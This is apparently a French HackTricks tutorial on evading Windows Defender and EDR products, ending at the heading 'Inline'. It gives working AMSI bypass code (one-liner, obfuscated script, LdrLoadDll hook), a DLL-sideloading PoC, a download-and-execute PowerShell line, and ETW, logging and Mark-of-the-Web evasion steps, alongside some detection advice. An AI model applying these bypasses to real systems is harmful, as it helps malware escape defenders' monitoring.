# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Cette page a été écrite par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrêter Defender

- [defendnot](https://github.com/es3n1n/defendnot) : Un outil pour empêcher Windows Defender de fonctionner.
- [no-defender](https://github.com/es3n1n/no-defender) : Un outil pour empêcher Windows Defender de fonctionner en simulant un autre AV.
- [Désactiver Defender si vous êtes admin](basic-powershell-for-pentesters/README.md)

## Méthodologie d'évasion AV

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : détection statique, analyse dynamique, et pour les EDRs plus avancés, analyse comportementale.

### Détection statique

La détection statique consiste à signaler des chaines connues ou des tableaux d'octets dans un binaire ou un script, et aussi à extraire des informations du fichier lui-même (par ex. description du fichier, nom de la société, signatures digitales, icône, checksum, etc.). Cela signifie que l'utilisation d'outils publics connus peut vous faire repérer plus facilement, car ils ont probablement été analysés et marqués comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Encryption**

Si vous chiffrez le binaire, il n'y aura aucun moyen pour l'AV de détecter votre programme, mais vous aurez besoin d'un loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier quelques chaînes dans votre binaire ou script pour le faire passer devant l'AV, mais cela peut être une tâche longue selon ce que vous essayez d'obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n'y aura pas de signatures connues, mais cela demande beaucoup de temps et d'efforts.

> [!TIP]
> Un bon moyen pour vérifier la détection statique par Windows Defender est [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il divise essentiellement le fichier en plusieurs segments puis demande à Defender de scanner chacun individuellement ; de cette façon, il peut vous indiquer exactement quelles sont les chaînes ou octets signalés dans votre binaire.

Je vous recommande vivement de consulter cette [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l'évasion AV pratique.

### Analyse dynamique

L'analyse dynamique consiste à exécuter votre binaire dans un sandbox et à surveiller les activités malveillantes (par ex. tenter de déchiffrer et lire les mots de passe du navigateur, effectuer un minidump sur LSASS, etc.). Cette partie peut être un peu plus délicate, mais voici quelques astuces pour échapper aux sandboxes.

- **Sleep before execution** Selon l'implémentation, cela peut être un excellent moyen de contourner l'analyse dynamique des AV. Les AV ont un temps très court pour scanner les fichiers afin de ne pas interrompre le flux de travail de l'utilisateur, donc utiliser des sleeps longs peut perturber l'analyse des binaires. Le problème est que de nombreux sandboxes d'AV peuvent simplement sauter le sleep selon leur implémentation.
- **Checking machine's resources** En général, les sandboxes ont très peu de ressources (par ex. < 2GB RAM), sinon ils ralentiraient la machine de l'utilisateur. Vous pouvez aussi faire preuve de créativité ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs ; tout n'est pas implémenté dans le sandbox.
- **Machine-specific checks** Si vous voulez cibler un utilisateur dont le poste est joint au domaine "contoso.local", vous pouvez vérifier le domaine de l'ordinateur pour voir s'il correspond à celui spécifié ; si ce n'est pas le cas, votre programme peut se terminer.

Il se trouve que le nom de machine du Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l'ordinateur dans votre malware avant la détonation : si le nom correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de Defender, vous pouvez donc faire terminer votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour contourner les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l'avons déjà dit, les **outils publics** finiront par **être détectés**, donc vous devriez vous poser cette question :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d'utiliser mimikatz** ? Ou pourriez-vous utiliser un projet différent, moins connu, qui fait aussi le dump de LSASS.

La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c'est probablement l'un des, sinon le plus signalé par les AVs et EDRs ; bien que le projet soit super, c'est un cauchemar pour le faire passer devant les AVs, donc cherchez simplement des alternatives pour atteindre votre objectif.

> [!TIP]
> Lors de la modification de vos payloads pour l'évasion, assurez-vous de **désactiver la soumission automatique d'échantillons** dans Defender, et s'il vous plaît, sérieusement, **NE PAS UPLOADER SUR VIRUSTOTAL** si votre objectif est d'atteindre l'évasion sur le long terme. Si vous voulez vérifier si votre payload est détecté par un AV particulier, installez-le sur une VM, essayez de désactiver la soumission automatique d'échantillons, et testez-y jusqu'à être satisfait du résultat.

## EXEs vs DLLs

Chaque fois que c'est possible, **privilégiez toujours l'utilisation de DLLs pour l'évasion** ; d'après mon expérience, les fichiers DLL sont généralement **beaucoup moins détectés** et analysés, c'est donc une astuce très simple à utiliser pour éviter la détection dans certains cas (si votre payload peut s'exécuter en tant que DLL, bien sûr).

Comme on peut le voir sur cette image, un payload DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, tandis que le payload EXE a un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nous allons maintenant montrer quelques astuces que vous pouvez utiliser avec des fichiers DLL pour être beaucoup plus discrets.

## DLL Sideloading & Proxying

**DLL Sideloading** exploite l'ordre de recherche des DLL utilisé par le loader en positionnant l'application victime et les payloads malveillants côte à côte.

Vous pouvez vérifier les programmes susceptibles de DLL Sideloading en utilisant [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant :
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles de DLL hijacking dans "C:\Program Files\\" et les fichiers DLL qu'ils tentent de charger.

Je vous recommande fortement de **explore DLL Hijackable/Sideloadable programs yourself**, cette technique est assez furtive si elle est bien exécutée, mais si vous utilisez des programmes Sideloadable connus publiquement, vous pouvez vous faire prendre facilement.

Le simple fait de placer une DLL malveillante portant le nom attendu par un programme ne chargera pas forcément votre payload, car le programme attend certaines fonctions spécifiques dans cette DLL ; pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** redirige les appels effectués par le programme depuis la DLL proxy (et malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme tout en permettant d'exécuter votre payload.

J'utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j'ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous fournira 2 fichiers : un template de code source pour la DLL, et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je **recommande vivement** de regarder [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sur DLL Sideloading et aussi [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en apprendre davantage sur ce que nous avons abordé plus en profondeur.

### Abuser les exports transférés (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des « forwarders » : au lieu de pointer vers du code, l'entrée d'export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu'un appelant résout l'export, le loader Windows va :

- Charger `TargetDll` s'il n'est pas déjà chargé
- Résoudre `TargetFunc` à partir de celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est un KnownDLL, il est fourni depuis l'espace de noms protégé KnownDLLs (p.ex., ntdll, kernelbase, ole32).
- Si `TargetDll` n'est pas un KnownDLL, l'ordre de recherche normal des DLL est utilisé, qui inclut le répertoire du module réalisant la résolution du forward.

Cela permet une primitive de sideloading indirecte : trouver une DLL signée qui exporte une fonction forwardée vers un nom de module non-KnownDLL, puis placer cette DLL signée dans le même répertoire qu'une DLL contrôlée par l'attaquant portant exactement le nom du module cible forwardé. Lorsque l'export forwardé est invoqué, le loader résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas un KnownDLL, donc il est résolu via l'ordre normal de recherche.

PoC (copier-coller) :
1) Copier la DLL système signée dans un dossier accessible en écriture
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un DllMain minimal suffit pour obtenir l'exécution de code ; vous n'avez pas besoin d'implémenter la forwarded function pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportement observé :
- rundll32 (signé) charge la side-by-side `keyiso.dll` (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le chargeur suit la redirection vers `NCRYPTPROV.SetAuditingInterface`
- Le chargeur charge ensuite `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n'est pas implémenté, vous obtiendrez une erreur "missing API" seulement après que `DllMain` se soit déjà exécuté

Conseils de détection :
- Concentrez-vous sur les exports forwardés dont le module cible n'est pas un KnownDLL. Les KnownDLLs sont listés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les exports forwardés avec des outils tels que:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Voir l'inventaire des forwarders Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Surveiller les LOLBins (e.g., rundll32.exe) qui chargent des DLL signées depuis des chemins non-système, puis chargent des non-KnownDLLs portant le même nom de base depuis ce répertoire
- Déclencher des alertes sur des chaînes processus/module telles que : `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sous des chemins accessibles en écriture par l'utilisateur
- Appliquer des politiques d'intégrité du code (WDAC/AppLocker) et interdire l'écriture+exécution dans les répertoires d'application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'évasion est un jeu du chat et de la souris : ce qui fonctionne aujourd'hui peut être détecté demain. Ne vous fiez jamais à un seul outil — si possible, essayez d'enchaîner plusieurs techniques d'évasion.

## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour prévenir [fileless malware](https://en.wikipedia.org/wiki/Fileless_malware). Initialement, les AV ne pouvaient analyser que les **fichiers sur le disque**, donc si vous pouviez exécuter des payloads **directement en mémoire**, l'AV ne pouvait rien faire pour l'empêcher, n'ayant pas une visibilité suffisante.

La fonctionnalité AMSI est intégrée aux composants suivants de Windows.

- User Account Control, ou UAC (élévation d'EXE, COM, MSI ou installation ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation dynamique du code)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- macros VBA d'Office

Cela permet aux solutions antivirus d'inspecter le comportement des scripts en exposant le contenu des scripts sous une forme non chiffrée et non obfusquée.

L'exécution de `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` générera l'alerte suivante dans Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il préfixe `amsi:` puis le chemin vers l'exécutable à partir duquel le script a été exécuté, ici powershell.exe

Nous n'avons déposé aucun fichier sur le disque, mais avons quand même été détectés en mémoire à cause d'AMSI.

De plus, à partir de **.NET 4.8**, le code C# passe également par AMSI. Cela affecte même `Assembly.Load(byte[])` pour l'exécution en mémoire. C'est pourquoi il est recommandé d'utiliser des versions plus anciennes de .NET (comme 4.7.2 ou inférieures) pour l'exécution en mémoire si vous voulez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

Étant donné qu'AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être un bon moyen d'éviter la détection.

Cependant, AMSI est capable de déobfusquer les scripts même s'ils ont plusieurs couches d'obfuscation, donc l'obfuscation peut être une mauvaise option selon la manière dont elle est réalisée. Cela rend l'évasion moins évidente. Toutefois, parfois il suffit de changer quelques noms de variables pour passer, donc cela dépend du degré de détection.

- **AMSI Bypass**

Étant donné qu'AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible de la manipuler facilement même en tant qu'utilisateur non privilégié. À cause de ce défaut dans l'implémentation d'AMSI, des chercheurs ont trouvé plusieurs moyens d'éviter son analyse.

**Forcing an Error**

Forcer l'initialisation d'AMSI à échouer (amsiInitFailed) fera en sorte qu'aucune analyse ne sera lancée pour le processus courant. Ceci a été initialement divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Il a suffi d'une ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell en cours. Cette ligne a bien sûr été signalée par AMSI lui-même, donc une modification est nécessaire pour pouvoir utiliser cette technique.

Voici un AMSI bypass modifié que j'ai pris depuis ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Gardez à l'esprit que cela sera probablement signalé une fois cette publication mise en ligne, donc vous ne devriez pas publier de code si votre objectif est de rester indétecté.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l'analyse de l'entrée fournie par l'utilisateur) et à l'écraser par des instructions renvoyant le code E_INVALIDARG ; de cette façon, le résultat de l'analyse réelle sera 0, interprété comme un résultat propre.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques pour contourner AMSI avec powershell ; consultez [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Bloquer AMSI en empêchant le chargement de amsi.dll (hook LdrLoadDll)

AMSI n'est initialisé qu'après que `amsi.dll` ait été chargé dans le processus courant. Un contournement robuste et indépendant du langage consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. Par conséquent, AMSI ne se charge jamais et aucune analyse n'a lieu pour ce processus.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Remarques
- Fonctionne sur PowerShell, WScript/CScript et les loaders personnalisés (tout ce qui chargerait autrement AMSI).
- À associer avec l'alimentation des scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter les artefacts liés à une ligne de commande longue.
- Observé utilisé par des loaders exécutés via des LOLBins (p. ex., `regsvr32` appelant `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Supprimer la signature détectée**

Vous pouvez utiliser un outil tel que **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour supprimer la signature AMSI détectée de la mémoire du processus courant. Cet outil fonctionne en scannant la mémoire du processus courant à la recherche de la signature AMSI puis en la remplaçant par des instructions NOP, la supprimant ainsi de la mémoire.

**Produits AV/EDR qui utilisent AMSI**

Vous pouvez trouver une liste de produits AV/EDR utilisant AMSI sur **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Utiliser PowerShell version 2**
Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être scannés par AMSI. Vous pouvez faire ceci:
```bash
powershell.exe -version 2
```
## Journalisation PowerShell

La journalisation PowerShell est une fonctionnalité qui vous permet d'enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile pour l'audit et le dépannage, mais cela peut aussi poser un **problème pour les attaquants qui cherchent à échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Disable PowerShell Transcription and Module Logging** : Vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Use Powershell version 2** : Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être scanné par AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session** : Utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer un powershell sans défenses (c'est ce que `powerpick` de Cobal Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d'obfuscation reposent sur le chiffrement des données, ce qui augmentera l'entropie du binaire et facilitera sa détection par les AVs et EDRs. Faites attention à cela et appliquez éventuellement le chiffrement uniquement aux sections spécifiques de votre code qui sont sensibles ou qui doivent être cachées.

### Déobfuscation des binaires .NET protégés par ConfuserEx

Lorsque vous analysez un malware qui utilise ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloqueront les décompilateurs et les sandboxes. Le workflow ci‑dessous restaure de manière fiable un IL presque original qui peut ensuite être décompilé en C# dans des outils tels que dnSpy ou ILSpy.

1.  Suppression de l'anti-tampering – ConfuserEx chiffre chaque *method body* et le décrypte à l'intérieur du constructeur statique du *module* (`<Module>.cctor`). Il patche également le checksum du PE de sorte que toute modification fera planter le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles lors de la construction de votre propre unpacker.

2.  Restauration des symboles / du contrôle de flux – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – sélectionner le profil ConfuserEx 2  
• de4dot annulera le flattening du contrôle de flux, restaurera les namespaces, classes et noms de variables originaux et déchiffrera les chaînes constantes.

3.  Suppression des proxy-calls – ConfuserEx remplace les appels directs de méthodes par des wrappers légers (a.k.a *proxy calls*) pour compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape, vous devriez observer des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire résultant sous dnSpy, recherchez de grands blobs Base64 ou l'utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le vrai payload. Souvent, le malware le stocke comme un tableau d'octets encodé TLV initialisé dans `<Module>.byte_0`.

La chaîne ci‑dessus restaure le flux d'exécution **sans** avoir besoin d'exécuter l'échantillon malveillant – utile lorsque l'on travaille sur une station hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme IOC pour triager automatiquement les samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'objectif de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle via la [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et la protection contre la falsification.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, à la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le framework de métaprogrammation de templates C++, ce qui compliquera un peu la tâche de la personne souhaitant craquer l'application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un x64 binary obfuscator capable d'obfusquer différents fichiers pe, y compris : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un moteur de code metamorphique simple pour exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d'obfuscation de code à granularité fine pour les langages supportés par LLVM utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant des instructions régulières en chaînes ROP, contrecarrant notre conception naturelle du flux de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un .NET PE Crypter écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor est capable de convertir des EXE/DLL existants en shellcode puis de les charger

## SmartScreen & MoTW

Vous avez peut-être vu cet écran en téléchargeant certains exécutables depuis Internet et en les exécutant.

Microsoft Defender SmartScreen est un mécanisme de sécurité destiné à protéger l'utilisateur final contre l'exécution d'applications potentiellement malveillantes.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen fonctionne principalement sur une approche basée sur la réputation, ce qui signifie que les applications peu téléchargées déclencheront SmartScreen, alertant et empêchant ainsi l'utilisateur final d'exécuter le fichier (bien que le fichier puisse toujours être exécuté en cliquant sur More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Vérification de l'ADS Zone.Identifier pour un fichier téléchargé depuis Internet.</p></figcaption></figure>

> [!TIP]
> Il est important de noter que les exécutables signés avec un certificat de signature **fiable** **ne déclencheront pas SmartScreen**.

Une manière très efficace d'empêcher vos payloads d'obtenir le Mark of The Web est de les empaqueter dans un conteneur tel qu'une ISO. Cela s'explique par le fait que Mark-of-the-Web (MOTW) **ne peut pas** être appliqué aux volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) est un outil qui empaquette des payloads dans des conteneurs de sortie pour éviter Mark-of-the-Web.

Exemple d'utilisation:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) est un puissant mécanisme de journalisation sous Windows qui permet aux applications et aux composants système de **consigner des événements**. Cependant, il peut aussi être utilisé par les produits de sécurité pour surveiller et détecter des activités malveillantes.

De la même façon que AMSI peut être désactivé (bypassé), il est aussi possible de faire en sorte que la fonction **`EtwEventWrite`** du processus en espace utilisateur retourne immédiatement sans enregistrer d'événements. Cela se fait en patchant la fonction en mémoire pour qu'elle retourne immédiatement, désactivant ainsi la journalisation ETW pour ce processus.

Vous pouvez trouver plus d'infos dans **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Charger des binaires C# en mémoire est connu depuis longtemps et reste une excellente manière d'exécuter vos outils de post-exploitation sans être détecté par l'AV.

Puisque le payload sera chargé directement en mémoire sans toucher au disque, il faudra seulement se préoccuper de patcher AMSI pour tout le processus.

La plupart des C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) offrent déjà la possibilité d'exécuter des assemblies C# directement en mémoire, mais il existe différentes façons de le faire :

- **Fork\&Run**

Cela implique **de lancer un nouveau processus sacrificiel**, d'injecter votre code malveillant de post-exploitation dans ce nouveau processus, d'exécuter votre code malveillant puis, une fois terminé, de tuer le nouveau processus. Cela comporte à la fois des avantages et des inconvénients. L'avantage de la méthode fork and run est que l'exécution se déroule **en dehors** de notre processus Beacon implant. Cela signifie que si quelque chose dans notre action de post-exploitation tourne mal ou est détecté, il y a une **bien plus grande chance** que notre **implant survive.** L'inconvénient est que vous avez une **plus grande probabilité** d'être détecté par des **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

